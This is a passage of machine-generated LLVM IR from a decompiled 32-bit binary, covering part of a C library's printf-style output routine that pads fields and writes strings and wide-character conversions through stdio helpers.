  %v3_8052ae5 = inttoptr i32 %v2_8052ae5 to i32*
  store i32 %v0_8052ae5, i32* %v3_8052ae5, align 4
  %v0_8052ae6 = call i32 @strnlen()
  store i32 %v0_8052ae6, i32* %eax.global-to-local, align 4
  %v0_8052aeb = load i32, i32* @esp, align 4
  %v1_8052aeb = add i32 %v0_8052aeb, 16
  %v7_8052aeb = icmp slt i32 %v1_8052aeb, 0
  store i1 %v7_8052aeb, i1* %sf.global-to-local, align 1
  store i32 %v0_8052ae6, i32* @esi, align 4
  br label %dec_label_pc_8052af0

dec_label_pc_8052af0:                             ; preds = %dec_label_pc_8052ab8, %dec_label_pc_8052ad6
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_8052b5e

dec_label_pc_8052af9:                             ; preds = %dec_label_pc_8052ac7
  store i32 %v2_8052af9, i32* %eax.global-to-local, align 4
  store i32 1, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v1_8052b07 = add i32 %v0_8052840.lcssa, 204
  store i32 %v1_8052b07, i32* @edi, align 4
  %v1_8052b0e = add i32 %v0_8052840.lcssa, 205
  %v2_8052b0e = inttoptr i32 %v1_8052b0e to i8*
  store i8 0, i8* %v2_8052b0e, align 1
  %v0_8052b16 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b16 = trunc i32 %v0_8052b16 to i8
  %v2_8052b16 = load i32, i32* @esp, align 4
  %v3_8052b16 = add i32 %v2_8052b16, 204
  %v4_8052b16 = inttoptr i32 %v3_8052b16 to i8*
  store i8 %v1_8052b16, i8* %v4_8052b16, align 1
  br label %dec_label_pc_8052b5e

dec_label_pc_8052b1f:                             ; preds = %dec_label_pc_8052ac2
  %v1_8052b1f = add i32 %v3_8052840, -20
  %v9_8052b1f = icmp eq i32 %v1_8052b1f, 0
  %v10_8052b1f = icmp slt i32 %v1_8052b1f, 0
  store i1 %v10_8052b1f, i1* %sf.global-to-local, align 1
  %v1_8052b22 = icmp eq i1 %v9_8052b1f, false
  br i1 %v1_8052b22, label %dec_label_pc_8052cc3, label %dec_label_pc_8052b28

dec_label_pc_8052b28:                             ; preds = %dec_label_pc_8052b1f
  %v0_8052b28 = load i32, i32* %stack_var_-364, align 4
  %v1_8052b28 = call i32 @__errno_location(i32 %v0_8052b28)
  store i32 %v1_8052b28, i32* %eax.global-to-local, align 4
  %v0_8052b2d = load i32, i32* %edx.global-to-local, align 4
  %v1_8052b2d = load i32, i32* @esp, align 4
  %v2_8052b2d = add i32 %v1_8052b2d, -4
  %v3_8052b2d = inttoptr i32 %v2_8052b2d to i32*
  store i32 %v0_8052b2d, i32* %v3_8052b2d, align 4
  %v1_8052b2e = add i32 %v1_8052b2d, -8
  %v2_8052b2e = inttoptr i32 %v1_8052b2e to i32*
  store i32 128, i32* %v2_8052b2e, align 4
  %v1_8052b33 = add i32 %v1_8052b2d, 204
  store i32 %v1_8052b33, i32* %edx.global-to-local, align 4
  %v2_8052b3a = add i32 %v1_8052b2d, -12
  %v3_8052b3a = inttoptr i32 %v2_8052b3a to i32*
  store i32 %v1_8052b33, i32* %v3_8052b3a, align 4
  %v1_8052b3b = inttoptr i32 %v1_8052b28 to i32*
  %v2_8052b3b = load i32, i32* %v1_8052b3b, align 4
  %v4_8052b3b = add i32 %v1_8052b2d, -16
  %v5_8052b3b = inttoptr i32 %v4_8052b3b to i32*
  store i32 %v2_8052b3b, i32* %v5_8052b3b, align 4
  %v0_8052b3d = call i32 @__GI___glibc_strerror_r()
  store i32 %v0_8052b3d, i32* %eax.global-to-local, align 4
  %v0_8052b42 = load i32, i32* @esp, align 4
  %v1_8052b42 = add i32 %v0_8052b42, 16
  %v7_8052b42 = icmp slt i32 %v1_8052b42, 0
  store i1 %v7_8052b42, i1* %sf.global-to-local, align 1
  store i32 %v0_8052b3d, i32* @edi, align 4
  br label %dec_label_pc_8052ad6

dec_label_pc_8052b49:                             ; preds = %dec_label_pc_80529ca, %dec_label_pc_80529c3, %dec_label_pc_80529b0
  %v0_8052b6636 = phi i32 [ %v1_8052959, %dec_label_pc_80529ca ], [ 0, %dec_label_pc_80529c3 ], [ 5, %dec_label_pc_80529b0 ]
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8052b63

dec_label_pc_8052b4d:                             ; preds = %dec_label_pc_8052ad0, %dec_label_pc_8052a42
  store i32 6, i32* @esi, align 4
  store i1 false, i1* %sf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  store i32 ptrtoint ([7 x i8]* @global_var_805db1e.926 to i32), i32* @edi, align 4
  br label %dec_label_pc_8052b5e

dec_label_pc_8052b5e:                             ; preds = %dec_label_pc_8052af9, %dec_label_pc_8052af0, %dec_label_pc_8052a84, %dec_label_pc_8052b4d
  %v0_8052b5e = load i32, i32* @esp, align 4
  %v1_8052b5e = add i32 %v0_8052b5e, 7
  %v2_8052b5e = inttoptr i32 %v1_8052b5e to i8*
  store i8 32, i8* %v2_8052b5e, align 1
  %v0_8052b66.pre = load i32, i32* @esi, align 4
  %v1_8052b66.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052b63

dec_label_pc_8052b63:                             ; preds = %dec_label_pc_8052b49, %dec_label_pc_80529d2, %dec_label_pc_8052b5e
  %v1_8052b66 = phi i32 [ 0, %dec_label_pc_8052b49 ], [ %v2_80529ca, %dec_label_pc_80529d2 ], [ %v1_8052b66.pre, %dec_label_pc_8052b5e ]
  %v0_8052b66 = phi i32 [ %v0_8052b6636, %dec_label_pc_8052b49 ], [ %v1_8052959, %dec_label_pc_80529d2 ], [ %v0_8052b66.pre, %dec_label_pc_8052b5e ]
  %v0_8052b63 = load i32, i32* @ebp, align 4
  %v1_8052b63 = add i32 %v0_8052b63, -11
  %v9_8052b63 = icmp eq i32 %v1_8052b63, 0
  %v10_8052b63 = icmp slt i32 %v1_8052b63, 0
  store i1 %v10_8052b63, i1* %sf.global-to-local, align 1
  %v2_8052b66 = add i32 %v0_8052b66, %v1_8052b66
  store i32 %v2_8052b66, i32* @edx, align 4
  br i1 %v9_8052b63, label %dec_label_pc_8052b77, label %dec_label_pc_8052b6b

dec_label_pc_8052b6b:                             ; preds = %dec_label_pc_8052b63
  %v1_8052b6d = add i32 %v0_8052b63, -5
  %v6_8052b6d = sub i32 4, %v0_8052b63
  %v7_8052b6d = and i32 %v6_8052b6d, %v0_8052b63
  %v8_8052b6d = icmp slt i32 %v7_8052b6d, 0
  %v9_8052b6d = icmp eq i32 %v1_8052b6d, 0
  %v10_8052b6d = icmp slt i32 %v1_8052b6d, 0
  store i1 %v10_8052b6d, i1* %sf.global-to-local, align 1
  %v3_8052b70 = icmp eq i1 %v10_8052b6d, %v8_8052b6d
  %v4_8052b70 = icmp eq i1 %v9_8052b6d, false
  %v5_8052b70 = and i1 %v4_8052b70, %v3_8052b70
  %v6_8052b70 = zext i1 %v5_8052b70 to i32
  store i32 %v6_8052b70, i32* %eax.global-to-local, align 4
  %v2_8052b73 = add i32 %v2_8052b66, 1
  %v3_8052b73 = add i32 %v2_8052b73, %v6_8052b70
  store i32 %v3_8052b73, i32* @edx, align 4
  br label %dec_label_pc_8052b77

dec_label_pc_8052b77:                             ; preds = %dec_label_pc_8052b63, %dec_label_pc_8052b6b
  %v0_8052b77 = load i32, i32* @esp, align 4
  %v1_8052b77 = add i32 %v0_8052b77, 24
  %v2_8052b77 = inttoptr i32 %v1_8052b77 to i32*
  %v3_8052b77 = load i32, i32* %v2_8052b77, align 4
  store i32 %v3_8052b77, i32* %eax.global-to-local, align 4
  %v1_8052b7b = add i32 %v0_8052b77, 8
  %v2_8052b7b = inttoptr i32 %v1_8052b7b to i32*
  store i32 0, i32* %v2_8052b7b, align 4
  %v0_8052b83 = load i32, i32* %eax.global-to-local, align 4
  %v1_8052b83 = load i32, i32* @edx, align 4
  %v2_8052b83 = sub i32 %v0_8052b83, %v1_8052b83
  %v7_8052b83 = icmp ult i32 %v0_8052b83, %v1_8052b83
  %v12_8052b83 = icmp eq i32 %v2_8052b83, 0
  %v13_8052b83 = icmp slt i32 %v2_8052b83, 0
  store i1 %v13_8052b83, i1* %sf.global-to-local, align 1
  %v2_8052b85 = or i1 %v7_8052b83, %v12_8052b83
  br i1 %v2_8052b85, label %dec_label_pc_8052b8d, label %dec_label_pc_8052b87

dec_label_pc_8052b87:                             ; preds = %dec_label_pc_8052b77
  store i1 %v13_8052b83, i1* %sf.global-to-local, align 1
  store i32 %v2_8052b83, i32* %eax.global-to-local, align 4
  %v1_8052b89 = load i32, i32* @esp, align 4
  %v2_8052b89 = add i32 %v1_8052b89, 8
  %v3_8052b89 = inttoptr i32 %v2_8052b89 to i32*
  store i32 %v2_8052b83, i32* %v3_8052b89, align 4
  %v0_8052b91.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8052b8d

dec_label_pc_8052b8d:                             ; preds = %dec_label_pc_8052b77, %dec_label_pc_8052b87
  %v0_8052b91 = phi i32 [ %v1_8052b83, %dec_label_pc_8052b77 ], [ %v0_8052b91.pre, %dec_label_pc_8052b87 ]
  %v0_8052b8d = load i32, i32* @esp, align 4
  %v1_8052b8d = add i32 %v0_8052b8d, 8
  %v2_8052b8d = inttoptr i32 %v1_8052b8d to i32*
  %v3_8052b8d = load i32, i32* %v2_8052b8d, align 4
  store i32 %v3_8052b8d, i32* @ecx, align 4
  %v2_8052b91 = add i32 %v3_8052b8d, %v0_8052b91
  store i32 %v2_8052b91, i32* %eax.global-to-local, align 4
  %v1_8052b94 = inttoptr i32 %v0_8052b8d to i32*
  %v2_8052b94 = load i32, i32* %v1_8052b94, align 4
  %v4_8052b94 = add i32 %v2_8052b94, %v2_8052b91
  %v15_8052b94 = icmp slt i32 %v4_8052b94, 0
  store i1 %v15_8052b94, i1* %sf.global-to-local, align 1
  store i32 %v4_8052b94, i32* %v1_8052b94, align 4
  %v0_8052b97 = load i32, i32* @esp, align 4
  %v1_8052b97 = add i32 %v0_8052b97, 7
  %v2_8052b97 = inttoptr i32 %v1_8052b97 to i8*
  %v3_8052b97 = load i8, i8* %v2_8052b97, align 1
  %v4_8052b97 = add i8 %v3_8052b97, -48
  %v9_8052b97 = icmp eq i8 %v4_8052b97, 0
  %v10_8052b97 = icmp slt i8 %v4_8052b97, 0
  store i1 %v10_8052b97, i1* %sf.global-to-local, align 1
  %v1_8052b9c = icmp eq i1 %v9_8052b97, false
  br i1 %v1_8052b9c, label %dec_label_pc_8052ba8, label %dec_label_pc_8052b9e

dec_label_pc_8052b9e:                             ; preds = %dec_label_pc_8052b8d
  %v0_8052b9e = load i32, i32* @ebx, align 4
  %v1_8052b9e = load i32, i32* @ecx, align 4
  %v2_8052b9e = add i32 %v1_8052b9e, %v0_8052b9e
  %v13_8052b9e = icmp slt i32 %v2_8052b9e, 0
  store i1 %v13_8052b9e, i1* %sf.global-to-local, align 1
  store i32 %v2_8052b9e, i32* @ebx, align 4
  %v1_8052ba0 = add i32 %v0_8052b97, 8
  %v2_8052ba0 = inttoptr i32 %v1_8052ba0 to i32*
  store i32 0, i32* %v2_8052ba0, align 4
  %v0_8052ba8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052ba8

dec_label_pc_8052ba8:                             ; preds = %dec_label_pc_8052b8d, %dec_label_pc_8052b9e
  %v0_8052baf = phi i32 [ %v0_8052b97, %dec_label_pc_8052b8d ], [ %v0_8052ba8.pre, %dec_label_pc_8052b9e ]
  %v1_8052ba8 = add i32 %v0_8052baf, 32
  %v2_8052ba8 = inttoptr i32 %v1_8052ba8 to i8*
  %v3_8052ba8 = load i8, i8* %v2_8052ba8, align 1
  %v4_8052ba8 = and i8 %v3_8052ba8, 8
  %v5_8052ba8 = icmp eq i8 %v4_8052ba8, 0
  store i1 false, i1* %sf.global-to-local, align 1
  %v1_8052bad = icmp eq i1 %v5_8052ba8, false
  br i1 %v1_8052bad, label %dec_label_pc_8052bd6, label %dec_label_pc_8052baf

dec_label_pc_8052baf:                             ; preds = %dec_label_pc_8052ba8
  %v1_8052baf = add i32 %v0_8052baf, 8
  %v2_8052baf = inttoptr i32 %v1_8052baf to i32*
  %v3_8052baf = load i32, i32* %v2_8052baf, align 4
  store i32 %v3_8052baf, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8052bb8 = add i32 %v0_8052baf, 368
  %v2_8052bb8 = inttoptr i32 %v1_8052bb8 to i32*
  %v3_8052bb8 = load i32, i32* %v2_8052bb8, align 4
  store i32 %v3_8052bb8, i32* @eax, align 4
  %v0_8052bbf = call i32 @_charpad()
  store i32 %v0_8052bbf, i32* %eax.global-to-local, align 4
  %v1_8052bc4 = load i32, i32* @esp, align 4
  %v2_8052bc4 = add i32 %v1_8052bc4, 8
  %v3_8052bc4 = inttoptr i32 %v2_8052bc4 to i32*
  %v4_8052bc4 = load i32, i32* %v3_8052bc4, align 4
  %v5_8052bc4 = sub i32 %v0_8052bbf, %v4_8052bc4
  %v15_8052bc4 = icmp eq i32 %v5_8052bc4, 0
  %v16_8052bc4 = icmp slt i32 %v5_8052bc4, 0
  store i1 %v16_8052bc4, i1* %sf.global-to-local, align 1
  %v1_8052bc8 = icmp eq i1 %v15_8052bc4, false
  br i1 %v1_8052bc8, label %dec_label_pc_8052cc3, label %dec_label_pc_8052bce

dec_label_pc_8052bce:                             ; preds = %dec_label_pc_8052baf
  store i32 0, i32* %v3_8052bc4, align 4
  %v1_8052bd6.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8052bd6

dec_label_pc_8052bd6:                             ; preds = %dec_label_pc_8052ba8, %dec_label_pc_8052bce
  %v1_8052bd6 = phi i32 [ %v0_8052baf, %dec_label_pc_8052ba8 ], [ %v1_8052bd6.pre, %dec_label_pc_8052bce ]
  %v0_8052bd6 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052bd6 = add i32 %v1_8052bd6, -4
  %v3_8052bd6 = inttoptr i32 %v2_8052bd6 to i32*
  store i32 %v0_8052bd6, i32* %v3_8052bd6, align 4
  %v0_8052bd7 = load i32, i32* %eax.global-to-local, align 4
  %v2_8052bd7 = add i32 %v1_8052bd6, -8
  %v3_8052bd7 = inttoptr i32 %v2_8052bd7 to i32*
  store i32 %v0_8052bd7, i32* %v3_8052bd7, align 4
  %v1_8052bd8 = add i32 %v1_8052bd6, 368
  %v2_8052bd8 = inttoptr i32 %v1_8052bd8 to i32*
  %v3_8052bd8 = load i32, i32* %v2_8052bd8, align 4
  %v5_8052bd8 = add i32 %v1_8052bd6, -12
  %v6_8052bd8 = inttoptr i32 %v5_8052bd8 to i32*
  store i32 %v3_8052bd8, i32* %v6_8052bd8, align 4
  %v0_8052bdf = load i32, i32* @ebp, align 4
  %v1_8052bdf = add i32 %v0_8052bdf, ptrtoint (i32* @global_var_805db25.927 to i32)
  store i32 %v1_8052bdf, i32* %eax.global-to-local, align 4
  %v2_8052be5 = add i32 %v1_8052bd6, -16
  %v3_8052be5 = inttoptr i32 %v2_8052be5 to i32*
  store i32 %v1_8052bdf, i32* %v3_8052be5, align 4
  %v0_8052be6 = call i32 @__GI_fputs_unlocked()
  store i32 %v0_8052be6, i32* %eax.global-to-local, align 4
  %v0_8052beb = load i32, i32* @esp, align 4
  %v1_8052beb = add i32 %v0_8052beb, 384
  %v2_8052beb = inttoptr i32 %v1_8052beb to i32*
  %v3_8052beb = load i32, i32* %v2_8052beb, align 4
  store i32 %v3_8052beb, i32* @eax, align 4
  %v0_8052bf2 = load i32, i32* @ebx, align 4
  store i32 %v0_8052bf2, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_8052bf9 = call i32 @_charpad()
  store i32 %v0_8052bf9, i32* %eax.global-to-local, align 4
  %v0_8052bfe = load i32, i32* @esp, align 4
  %v1_8052bfe = add i32 %v0_8052bfe, 16
  %v1_8052c01 = load i32, i32* @ebx, align 4
  %v2_8052c01 = sub i32 %v0_8052bf9, %v1_8052c01
  %v12_8052c01 = icmp eq i32 %v2_8052c01, 0
  %v13_8052c01 = icmp slt i32 %v2_8052c01, 0
  store i1 %v13_8052c01, i1* %sf.global-to-local, align 1
  %v1_8052c03 = icmp eq i1 %v12_8052c01, false
  br i1 %v1_8052c03, label %dec_label_pc_8052cc3, label %dec_label_pc_8052c09

dec_label_pc_8052c09:                             ; preds = %dec_label_pc_8052bd6
  %v1_8052c09 = add i32 %v0_8052bfe, 356
  %v2_8052c09 = inttoptr i32 %v1_8052c09 to i32*
  %v3_8052c09 = load i32, i32* %v2_8052c09, align 4
  %v4_8052c09 = icmp eq i32 %v3_8052c09, 0
  %v5_8052c09 = icmp slt i32 %v3_8052c09, 0
  store i1 %v5_8052c09, i1* %sf.global-to-local, align 1
  %v1_8052c11 = icmp eq i1 %v4_8052c09, false
  br i1 %v1_8052c11, label %dec_label_pc_8052c35, label %dec_label_pc_8052c13

dec_label_pc_8052c13:                             ; preds = %dec_label_pc_8052c09
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_8052c15 = load i32, i32* @esi, align 4
  %v1_8052c15 = icmp eq i32 %v0_8052c15, 0
  %v2_8052c15 = icmp slt i32 %v0_8052c15, 0
  store i1 %v2_8052c15, i1* %sf.global-to-local, align 1
  br i1 %v1_8052c15, label %dec_label_pc_8052c2b, label %dec_label_pc_8052c19

dec_label_pc_8052c19:                             ; preds = %dec_label_pc_8052c13
  %v2_8052c19 = add i32 %v0_8052bfe, 12
  %v3_8052c19 = inttoptr i32 %v2_8052c19 to i32*
  store i32 0, i32* %v3_8052c19, align 4
  %v1_8052c1a = add i32 %v0_8052bfe, 384
  %v2_8052c1a = inttoptr i32 %v1_8052c1a to i32*
  %v3_8052c1a = load i32, i32* %v2_8052c1a, align 4
  %v5_8052c1a = add i32 %v0_8052bfe, 8
  %v6_8052c1a = inttoptr i32 %v5_8052c1a to i32*
  store i32 %v3_8052c1a, i32* %v6_8052c1a, align 4
  %v0_8052c21 = load i32, i32* @esi, align 4
  %v2_8052c21 = add i32 %v0_8052bfe, 4
  %v3_8052c21 = inttoptr i32 %v2_8052c21 to i32*
  store i32 %v0_8052c21, i32* %v3_8052c21, align 4
  %v0_8052c22 = load i32, i32* @edi, align 4
  %v3_8052c22 = inttoptr i32 %v0_8052bfe to i32*
  store i32 %v0_8052c22, i32* %v3_8052c22, align 4
  %v0_8052c23 = load i32, i32* %stack_var_-364, align 4
  %v4_8052c23 = call i32 @__stdio_fwrite(i32 %v0_8052c23, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8052c23, i32* %eax.global-to-local, align 4
  %v0_8052c28 = load i32, i32* @esp, align 4
  %v1_8052c28 = add i32 %v0_8052c28, 16
  %v7_8052c28 = icmp slt i32 %v1_8052c28, 0
  store i1 %v7_8052c28, i1* %sf.global-to-local, align 1
  %v1_8052c2b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8052c2b

dec_label_pc_8052c2b:                             ; preds = %dec_label_pc_8052c13, %dec_label_pc_8052c19
  %v0_8052c9548 = phi i32 [ %v1_8052bfe, %dec_label_pc_8052c13 ], [ %v1_8052c28, %dec_label_pc_8052c19 ]
  %v1_8052c2b = phi i32 [ 0, %dec_label_pc_8052c13 ], [ %v1_8052c2b.pre, %dec_label_pc_8052c19 ]
  %v0_8052c2b = phi i32 [ 0, %dec_label_pc_8052c13 ], [ %v4_8052c23, %dec_label_pc_8052c19 ]
  %v2_8052c2b = sub i32 %v0_8052c2b, %v1_8052c2b
  %v12_8052c2b = icmp eq i32 %v2_8052c2b, 0
  %v13_8052c2b = icmp slt i32 %v2_8052c2b, 0
  store i1 %v13_8052c2b, i1* %sf.global-to-local, align 1
  %v1_8052c2d = icmp eq i1 %v12_8052c2b, false
  br i1 %v1_8052c2d, label %dec_label_pc_8052cc3, label %dec_label_pc_8052c95

dec_label_pc_8052c35:                             ; preds = %dec_label_pc_8052c09
  %v1_8052c35 = add i32 %v0_8052bfe, 348
  %v2_8052c35 = inttoptr i32 %v1_8052c35 to i32*
  store i32 0, i32* %v2_8052c35, align 4
  %v0_8052c9110 = load i32, i32* @esi, align 4
  %v1_8052c9111 = icmp eq i32 %v0_8052c9110, 0
  %v2_8052c9112 = icmp slt i32 %v0_8052c9110, 0
  store i1 %v2_8052c9112, i1* %sf.global-to-local, align 1
  %v1_8052c9318 = icmp eq i1 %v1_8052c9111, false
  %v0_8052c42.pre = load i32, i32* @esp, align 4
  br i1 %v1_8052c9318, label %dec_label_pc_8052c42, label %dec_label_pc_8052c95

dec_label_pc_8052c42:                             ; preds = %dec_label_pc_8052c35, %dec_label_pc_8052c8f
  %v0_8052c49 = phi i32 [ %v2_8052c8f, %dec_label_pc_8052c8f ], [ %v0_8052c9110, %dec_label_pc_8052c35 ]
  %v1_8052c54 = phi i32 [ %v0_8052c4243, %dec_label_pc_8052c8f ], [ %v0_8052c42.pre, %dec_label_pc_8052c35 ]
  %v1_8052c42 = add i32 %v1_8052c54, 332
  store i32 %v1_8052c42, i32* %edx.global-to-local, align 4
  %v1_8052c49 = add i32 %v0_8052c49, -128
  %v2_8052c49 = icmp ult i32 %v0_8052c49, 128
  %v6_8052c49 = icmp eq i32 %v1_8052c49, 0
  %v7_8052c49 = icmp slt i32 %v1_8052c49, 0
  store i1 %v7_8052c49, i1* %sf.global-to-local, align 1
  store i32 128, i32* %eax.global-to-local, align 4
  %v2_8052c54 = add i32 %v1_8052c54, -4
  %v3_8052c54 = inttoptr i32 %v2_8052c54 to i32*
  store i32 %v1_8052c42, i32* %v3_8052c54, align 4
  %v2_8052c55 = or i1 %v2_8052c49, %v6_8052c49
  %v3_8052c55 = load i32, i32* %eax.global-to-local, align 4
  %v4_8052c55 = load i32, i32* @esi, align 4
  %v5_8052c55 = select i1 %v2_8052c55, i32 %v4_8052c55, i32 %v3_8052c55
  %v2_8052c58 = add i32 %v1_8052c54, -8
  %v3_8052c58 = inttoptr i32 %v2_8052c58 to i32*
  store i32 %v5_8052c55, i32* %v3_8052c58, align 4
  %v1_8052c59 = add i32 %v1_8052c54, 340
  store i32 %v1_8052c59, i32* %eax.global-to-local, align 4
  %v2_8052c60 = add i32 %v1_8052c54, -12
  %v3_8052c60 = inttoptr i32 %v2_8052c60 to i32*
  store i32 %v1_8052c59, i32* %v3_8052c60, align 4
  %v1_8052c61 = add i32 %v1_8052c54, 204
  store i32 %v1_8052c61, i32* @edi, align 4
  %v2_8052c68 = add i32 %v1_8052c54, -16
  %v3_8052c68 = inttoptr i32 %v2_8052c68 to i32*
  store i32 %v1_8052c61, i32* %v3_8052c68, align 4
  %v0_8052c69 = call i32 @__GI_wcsrtombs()
  %v0_8052c6e = load i32, i32* @esp, align 4
  %v1_8052c6e = add i32 %v0_8052c6e, 16
  store i32 %v0_8052c69, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_8052c75 = icmp eq i32 %v0_8052c69, 0
  %v2_8052c75 = icmp slt i32 %v0_8052c69, 0
  store i1 %v2_8052c75, i1* %sf.global-to-local, align 1
  br i1 %v1_8052c75, label %dec_label_pc_8052c8b, label %dec_label_pc_8052c79

dec_label_pc_8052c79:                             ; preds = %dec_label_pc_8052c42
  %v0_8052c79 = load i32, i32* @ebp, align 4
  %v2_8052c79 = add i32 %v0_8052c6e, 12
  %v3_8052c79 = inttoptr i32 %v2_8052c79 to i32*
  store i32 %v0_8052c79, i32* %v3_8052c79, align 4
  %v1_8052c7a = add i32 %v0_8052c6e, 384
  %v2_8052c7a = inttoptr i32 %v1_8052c7a to i32*
  %v3_8052c7a = load i32, i32* %v2_8052c7a, align 4
  %v5_8052c7a = add i32 %v0_8052c6e, 8
  %v6_8052c7a = inttoptr i32 %v5_8052c7a to i32*
  store i32 %v3_8052c7a, i32* %v6_8052c7a, align 4
  %v2_8052c81 = add i32 %v0_8052c6e, 4
  %v3_8052c81 = inttoptr i32 %v2_8052c81 to i32*
  store i32 %v0_8052c69, i32* %v3_8052c81, align 4
  %v0_8052c82 = load i32, i32* @edi, align 4
  %v3_8052c82 = inttoptr i32 %v0_8052c6e to i32*
  store i32 %v0_8052c82, i32* %v3_8052c82, align 4
  %v0_8052c83 = load i32, i32* %stack_var_-364, align 4
  %v4_8052c83 = call i32 @__stdio_fwrite(i32 %v0_8052c83, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8052c83, i32* %eax.global-to-local, align 4
  %v0_8052c88 = load i32, i32* @esp, align 4
  %v1_8052c88 = add i32 %v0_8052c88, 16
  %v7_8052c88 = icmp slt i32 %v1_8052c88, 0
  store i1 %v7_8052c88, i1* %sf.global-to-local, align 1
  br label %dec_label_pc_8052c8b

dec_label_pc_8052c8b:                             ; preds = %dec_label_pc_8052c42, %dec_label_pc_8052c79
  %v1_8052c8f = phi i32 [ 0, %dec_label_pc_8052c42 ], [ %v4_8052c83, %dec_label_pc_8052c79 ]
  %v0_8052c4243 = phi i32 [ %v1_8052c6e, %dec_label_pc_8052c42 ], [ %v1_8052c88, %dec_label_pc_8052c79 ]
  %v2_8052c8b = sub i32 %v1_8052c8f, %v0_8052c69
  %v12_8052c8b = icmp eq i32 %v2_8052c8b, 0
  %v13_8052c8b = icmp slt i32 %v2_8052c8b, 0
  store i1 %v13_8052c8b, i1* %sf.global-to-local, align 1
  %v1_8052c8d = icmp eq i1 %v12_8052c8b, false
  br i1 %v1_8052c8d, label %dec_label_pc_8052cc3, label %dec_label_pc_8052c8f

dec_label_pc_8052c8f:                             ; preds = %dec_label_pc_8052c8b
  %v0_8052c8f = load i32, i32* @esi, align 4
  %v2_8052c8f = sub i32 %v0_8052c8f, %v1_8052c8f
  %v12_8052c8f = icmp eq i32 %v2_8052c8f, 0
  %v13_8052c8f = icmp slt i32 %v2_8052c8f, 0
  store i32 %v2_8052c8f, i32* @esi, align 4
  store i1 %v13_8052c8f, i1* %sf.global-to-local, align 1
  %v1_8052c93 = icmp eq i1 %v12_8052c8f, false
  br i1 %v1_8052c93, label %dec_label_pc_8052c42, label %dec_label_pc_8052c95

dec_label_pc_8052c95:                             ; preds = %dec_label_pc_8052c8f, %dec_label_pc_8052c35, %dec_label_pc_8052c2b
  %v0_8052c95 = phi i32 [ %v0_8052c9548, %dec_label_pc_8052c2b ], [ %v0_8052c42.pre, %dec_label_pc_8052c35 ], [ %v0_8052c4243, %dec_label_pc_8052c8f ]
  %v1_8052c95 = add i32 %v0_8052c95, 8
  %v2_8052c95 = inttoptr i32 %v1_8052c95 to i32*
  %v3_8052c95 = load i32, i32* %v2_8052c95, align 4
  store i32 %v3_8052c95, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_8052c9e = add i32 %v0_8052c95, 368
  %v2_8052c9e = inttoptr i32 %v1_8052c9e to i32*
  %v3_8052c9e = load i32, i32* %v2_8052c9e, align 4
  store i32 %v3_8052c9e, i32* @eax, align 4
  %v0_8052ca5 = call i32 @_charpad()
  store i32 %v0_8052ca5, i32* %eax.global-to-local, align 4
  %v1_8052caa = load i32, i32* @esp, align 4
  %v2_8052caa = add i32 %v1_8052caa, 8
  %v3_8052caa = inttoptr i32 %v2_8052caa to i32*
  %v4_8052caa = load i32, i32* %v3_8052caa, align 4
  %v5_8052caa = sub i32 %v0_8052ca5, %v4_8052caa
  %v15_8052caa = icmp eq i32 %v5_8052caa, 0
  %v16_8052caa = icmp slt i32 %v5_8052caa, 0
  store i1 %v16_8052caa, i1* %sf.global-to-local, align 1
  %v1_8052cae = icmp eq i1 %v15_8052caa, false
  br i1 %v1_8052cae, label %dec_label_pc_8052cc3, label %dec_label_pc_8052cb0

dec_label_pc_8052cb0:                             ; preds = %dec_label_pc_8052c95, %dec_label_pc_8052a1d, %dec_label_pc_8052848
  %v0_8052cb0 = phi i32 [ %v1_8052caa, %dec_label_pc_8052c95 ], [ %v0_8052cb0.pre, %dec_label_pc_8052a1d ], [ %v1_8052866, %dec_label_pc_8052848 ]
  %v1_8052cb0 = add i32 %v0_8052cb0, 16
  %v2_8052cb0 = inttoptr i32 %v1_8052cb0 to i32*
  %v3_8052cb0 = load i32, i32* %v2_8052cb0, align 4
  store i32 %v3_8052cb0, i32* @ebx, align 4
  store i32 %v3_8052cb0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80527a0.backedge

dec_label_pc_8052cbb:                             ; preds = %dec_label_pc_80527de
  %v1_8052cbb = add i32 %v0_8052cbb, 2
  %v10_8052cbb = icmp slt i32 %v1_8052cbb, 0
  store i1 %v10_8052cbb, i1* %sf.global-to-local, align 1
  store i32 %v1_8052cbb, i32* @ebx, align 4
  br label %dec_label_pc_80527a0.backedge

dec_label_pc_8052cc3:                             ; preds = %dec_label_pc_80527ca, %dec_label_pc_8052c95, %dec_label_pc_8052c2b, %dec_label_pc_8052bd6, %dec_label_pc_8052baf, %dec_label_pc_8052b1f, %dec_label_pc_8052a92, %dec_label_pc_8052a53, %dec_label_pc_80529f4, %dec_label_pc_8052c8b
